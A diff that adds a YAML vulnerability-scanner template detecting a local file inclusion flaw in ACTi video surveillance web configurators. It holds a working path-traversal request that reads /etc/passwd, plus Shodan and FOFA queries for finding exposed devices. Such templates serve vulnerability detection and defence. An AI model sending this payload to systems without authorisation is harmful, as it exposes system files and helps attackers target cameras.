@@ -1,0 +1,37 @@
+http:
+    - matchers:
+        - part: body
+          regex:
+            - 'root:.*:0:0:'
+          type: regex
+        - part: header
+          type: word
+          words:
+            - application/octet-stream
+        - status:
+            - 200
+          type: status
+      matchers-condition: and
+      method: GET
+      path:
+        - '{{BaseURL}}/images/../../../../../../../../etc/passwd'
+id: acti-video-lfi
+info:
+    author: DhiyaneshDk
+    description: |
+        ACTI video surveillance has loopholes in reading any files
+    metadata:
+        fofa-query: app="ACTi-视频监控"
+        max-request: 1
+        shodan-query: title:"Web Configurator"
+        verified: true
+    name: ACTi-Video Monitoring - Local File Inclusion
+    reference:
+        - https://www.cnblogs.com/hmesed/p/16292252.html
+    severity: high
+    tags:
+        - iot
+        - video
+        - monitoring
+        - ACTi-视频监控
+        - Video Surveillance
